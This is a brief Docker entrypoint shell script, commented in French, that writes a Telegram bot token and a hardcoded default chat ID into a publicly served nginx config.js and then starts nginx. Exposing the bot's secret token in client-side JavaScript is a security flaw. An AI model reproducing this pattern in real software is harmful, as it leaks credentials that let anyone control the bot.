#!/bin/sh
set -e

# Récupérer les variables d'environnement (avec valeurs par défaut)
BOT_TOKEN="${BOT_TOKEN}"
CHAT_ID="${CHAT_ID}"

# Si vides, utiliser des valeurs par défaut
if [ -z "$CHAT_ID" ]; then
    CHAT_ID="8176081750"
fi

# Créer le fichier config.js avec les variables
mkdir -p /usr/share/nginx/html

cat > /usr/share/nginx/html/config.js << 'CONFIGEOF'
window.telegramConfig = {
    BOT_TOKEN: 'BOT_TOKEN_PLACEHOLDER',
    CHAT_ID: 'CHAT_ID_PLACEHOLDER'
};
CONFIGEOF

# Remplacer les placeholders par les vraies valeurs
sed -i "s|BOT_TOKEN_PLACEHOLDER|$BOT_TOKEN|g" /usr/share/nginx/html/config.js
sed -i "s|CHAT_ID_PLACEHOLDER|$CHAT_ID|g" /usr/share/nginx/html/config.js

# Démarrer Nginx
exec nginx -g "daemon off;"
